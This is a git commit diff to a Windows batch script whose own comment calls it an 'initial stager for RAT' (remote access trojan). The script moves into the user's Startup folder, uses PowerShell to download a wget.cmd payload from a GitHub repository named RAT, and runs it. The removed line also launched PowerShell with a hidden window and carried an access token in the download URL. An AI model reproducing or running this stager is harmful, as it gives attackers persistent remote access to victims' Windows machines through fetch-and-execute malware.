fefcd9db792567797a28065793b14d96d0a3338c
riahifiras <120566908+riahifiras@users.noreply.github.com>
2024-04-13 14:15:21 +0100

    wiiiw

--- initial.cmd
+++ initial.cmd
@@ -1,4 +1,4 @@
-@echo off
+@REM @echo off
 @REM initial stager for RAT
 
 @REM variables
@@ -9,7 +9,7 @@ set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 cd %STARTUP%
 
 @REM write payloads to startup
-powershell powershell.exe - windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/riahifiras/RAT/main/files/wget.cmd?token=GHSAT0AAAAAACN2XZL7CK3UWN2UV3YYFOICZQ2QJLA' -OutFile 'wget.cmd'"
+powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/wget.cmd -OutFile wget.cmd"
 
 @REM run payload
 powershell "./wget.cmd"
